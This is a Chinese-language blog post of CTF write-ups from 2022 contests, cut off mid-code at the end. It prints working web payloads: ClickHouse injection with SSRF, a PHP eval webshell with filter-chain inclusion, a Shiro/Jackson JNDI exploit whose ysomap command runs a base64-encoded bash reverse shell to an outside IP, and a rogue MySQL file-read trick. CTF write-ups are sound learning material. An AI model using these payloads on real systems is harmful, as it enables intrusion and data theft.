



<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="暮间的花园" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="暮间的花园" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="暮间的花园" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2023/02/20/check_in_wp(3)/">



  <title>
2022年的一些比赛部分题解 |
Yume Shoka = 暮间的花园</title>
<meta name="generator" content="Hexo 6.0.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">2022年的一些比赛部分题解
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2023-02-20 22:12:50">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2023-02-20T22:12:50+08:00">2023-02-20</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="cn">
  <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/20/check_in_wp(3)/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="muhua">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="暮间的花园">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="bytectf"><a href="#bytectf" class="headerlink" title="bytectf"></a>bytectf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="double-sqli"><a href="#double-sqli" class="headerlink" title="double sqli"></a>double sqli</h3><p>访问，首先后面的参数id就很可疑，尝试mysql注入，单引号闭合，发现回显有点奇怪，尝试万能密码，发现回显是<code>concat(1,1)=1</code>，再直接输入<code>?id=1|1--+</code>，这时我仍以为是mysql注入，这个concat就是个连接，那么直接在<code>||</code>之后注入就行，然后查询<code>?id=1||(select database())</code>,得到一个default，但再用mysql注入就不行了<br>遇到无回显的时候直接出了一个<code>something in files</code>，点开，发现是个图，直接访问<code>/files/</code>，发现存在目录穿越，直接访问<code>/files../</code>，app目录下找到源码，东翻西找发现是个clickhouse的sql注入，查询资料，直接注入，查到ctf库，在查到一个hint表，查看ctf.hint，<code>(select *from ctf.hint)</code>，发现内容是，我这个菜逼没权限，于是再看看源码，使用的账号是user_02，那肯定有01，那么就找，搜到<code>/var/lib/clickhouse/access 存放的是线上所有用户的授权的sql</code>，真找到了，但看了很久文档都没看到可以用的语句，之后找到一篇文章<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpnM05EVTJNVGcwTmc9PSZtaWQ9MjI0NzQ4NTMyMyZpZHg9MSZzbj0zMzQzMjEwYjRkNWNhMmFjY2U2ZDc0MDhmZmU5OTJiNw==">ClickHouse数据库 8123端口的未授权访问</span>，但打开自己的服务器尝试curl似乎连不上，再往后看，发现一个url函数，回头看看文档，直接进行ssrf，<code>(select * from url(&#39;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=(select%2520*from%2520ctf.flag)&#39;,CSV,&#39;columns String&#39;))</code></p>
<h2 id="拟态"><a href="#拟态" class="headerlink" title="拟态"></a>拟态</h2><h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>题目描述：计算器出现的第零天，爱他</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">readFile</span>(<span class="string">&#x27;./src/index.js&#x27;</span>) = </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> notevil = <span class="built_in">require</span>(<span class="string">&quot;./notevil&quot;</span>); <span class="comment">// patched something...</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&quot;cookie-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieSession</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">  <span class="attr">keys</span>: [<span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">16</span>)],</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in root directory but name is randomized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> utils = &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(crypto.<span class="title function_">createHash</span>(<span class="string">&quot;md5&quot;</span>).<span class="title function_">update</span>(s).<span class="title function_">digest</span>(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">readFile</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">readFile</span>(n, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./static/index.html&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="string">&quot;&#123;&#123;res&#125;&#125;&quot;</span>, s.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.<span class="property">body</span>.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">const</span> his = req.<span class="property">session</span>.<span class="property">his</span> || [];</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> ret = (<span class="keyword">await</span> <span class="title function_">notevil</span>(e, utils)).<span class="title function_">toString</span>();</span><br><span class="line">      his.<span class="title function_">unshift</span>(<span class="string">`<span class="subst">$&#123;e&#125;</span> = <span class="subst">$&#123;ret&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">if</span> (his.<span class="property">length</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        his.<span class="title function_">pop</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">      his.<span class="title function_">add</span>(<span class="string">`<span class="subst">$&#123;e&#125;</span> = wrong?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">his</span> = his;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(his));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">8888</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本以为是一个<code>notevil(e, utils)</code>漏洞，但这里已经被修复了，尝试readFile(‘&#x2F;flag’)</p>
<h3 id="esayfilter"><a href="#esayfilter" class="headerlink" title="esayfilter"></a>esayfilter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">5</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写马传：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><code>./files/22698814ea</code></p>
<p><code>http://124.70.181.14:32767/?action=r&amp;r=convert.base64-decode/resource@/../../../files/22698814ea&amp;1=system(%27cat%20/flag%27);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(): unable to locate filter &quot;resource=.&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (resource=.) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;files&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (files) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;resource@&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (resource@) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;..&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (..) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;..&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (..) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;..&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (..) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;files&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (files) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): unable to locate filter &quot;22698814ea&quot; in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">Warning: include(): Unable to create filter (22698814ea) in /var/www/html/index.php on line 16</span><br><span class="line"></span><br><span class="line">flag&#123;Cuw5RV9SvBUJR1ACBgLBm83p2VZe7lRG&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上是Du1L0ve师傅比赛时打出来payload</p>
<p>经过师傅的赛后分析讲解，已经大致搞明白这个的原理，payload可以简言之可以精简为以下：</p>
<p><code>?action=r&amp;r=convert.base64-decode/../22698814ea&amp;1=system(%27cat%20/flag%27);</code></p>
<p>简单来说，resource参数将值作为一个文件去检测是否文件存在</p>
<p>经过目录穿越反复横跳检测该文件为存在</p>
<p>接着filter将之后的所有内容，也就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource=./files/convert.base64-decode/../22698814ea</span><br></pre></td></tr></table></figure>
<p>以斜杠为分隔，尝试建立过滤器，<code>convert.base64-decode</code>过滤器创建成功，将读取出的信息进行了base64解码</p>
<p>最终得到的马被文件包含，成功rce</p>
<h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>原题</p>
<p>扫，得到&#x2F;json</p>
<p><img data-src="https://xiquanmuhua.github.io/images/nitai/json1.png" alt="result"></p>
<p>然后抓包，发现重定向到&#x2F;login</p>
<p>回显 ：<code>登录失败</code>以及响应头：<code>rememberMe=deleteMe</code></p>
<p>使用CVE-2020-1957绕过：</p>
<p>GET :<code>/;/json</code></p>
<p>POST：<code>true</code></p>
<p>返回：<code>jackson interface</code></p>
<p>jackson反序列化 + JNDI注入 + LDAP返回序列化数据触发本地Gadget Bypass jdk 8u_191限制</p>
<p><img data-src="https://xiquanmuhua.github.io/images/nitai/json3.png" alt="result"></p>
<p>使用工具ysomap</p>
<p>工具需要<code>jdk8</code>环境运行，并且安装配置<code>maven</code>，安装过程写在文章<code>服务器相关</code>里了，服务器开两个端口，xshell打开两个窗口，拿一个端口作为跳板进行接收，另一个端口弹shell</p>
<p>8084端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cli/target&gt;java -jar ysomap.jar cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接着输入如下指令</span></span><br><span class="line"></span><br><span class="line">use exploit LDAPLocalChainListener</span><br><span class="line"><span class="built_in">set</span> lport 8084</span><br><span class="line">use payload  CommonsCollections8</span><br><span class="line">use bullet TransformerBullet</span><br><span class="line"><span class="built_in">set</span> version 3</span><br><span class="line">args <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDcuNTYuMjQ0LzgwODUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>8085端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc --lvvp 8085</span><br></pre></td></tr></table></figure>

<p>发包<br>GET:<code>/;/json</code></p>
<p>POST:<code>[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap://ip:PORT/Calc&quot;&#125;]</code></p>
<p>弹shell成功，执行：</p>
<!-- flag{XZgw550JXoWU0EI1ATBsTtZFSOwyX1FM} -->
<p><img data-src="https://xiquanmuhua.github.io/images/nitai/json2.png" alt="result"></p>
<p>终于自己复现成功了，happy，不过知识点还需要看看</p>
<h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p>打开页面，点击开始，抓包，传入了一些输入的参数</p>
<p>查看源码：在install.php中，输入的内容是进行数据库连接验证</p>
<p>远程连接数据库，可以使用工具roguemysql，搭建一个伪造的数据库，当靶机连接上这个伪造的服务器时，即可进行任意文件读取</p>
<p>直接使用工具给出的php文件，stream_socket_server函数里的参数的端口修改成一个已经开启的闲置端口，然后在服务器上执行该文件</p>
<p>另一边对抓包内容修改，数据库适配器出输入的值修改成Mysqli，ip填的服务器地址47.107.56.244，端口填之前改的那个</p>
<p><img data-src="https://xiquanmuhua.github.io/images/nitai/sql1.png" alt="result"></p>
<p>发包，这边测试一下index.php，读取成功，读取根目录下flag</p>
<!-- flag{HpQYP8Z6wRgb2pPLwVOupVRM71zwkKOG} -->

<p><img data-src="https://xiquanmuhua.github.io/images/nitai/sql2.png" alt="result"></p>
<h3 id="newhospital"><a href="#newhospital" class="headerlink" title="newhospital"></a>newhospital</h3><p>祖传f12，发现源码中有<code>index.php?id=</code></p>
<p>尝试随意输入没有反应，挨个尝试，发现在<code>feature.php</code>发现报错</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knowledge</span><br><span class="line">Warning: <span class="title function_ invoke__">file_get_contents</span>(<span class="number">2</span>.js): failed to open stream: No such file <span class="keyword">or</span> directory in /<span class="keyword">var</span>/www/html/feature.php on line <span class="number">468</span></span><br></pre></td></tr></table></figure>
<p>那么源码部分应该是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]<span class="string">&#x27;.js&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>%00截断失败，应该是高于5.4版本</p>
<p>扫靶机，得到<code>/old/</code>文件夹，再扫<code>/old/</code>文件夹，发现下面结构和工作目录下一样，于是访问<code>/old/feature</code>，发现无论如何报错都是2.js，最后抓包发现cookie处有一个参数：<code>API</code>，值是base64编码，解码之后就是<code>2.js</code>，尝试修改，确实就是这里进行命令执行，直接包含工作目录下的<code>flag.php</code>，因为是在old目录下，所以需要目录穿越一下就行了</p>
<h3 id="ezpickle"><a href="#ezpickle" class="headerlink" title="ezpickle"></a>ezpickle</h3><p>用柠檬师傅的curl带出flag的方法成功了，高高兴兴去尝试三月七师傅的弹shell，为什么弹不出啊！为什么直接用他的脚本改成我的服务器ip就会报错啊！我仍未知道那天弹不了shell的原因……</p>
<p>总之成功了一个方法</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span 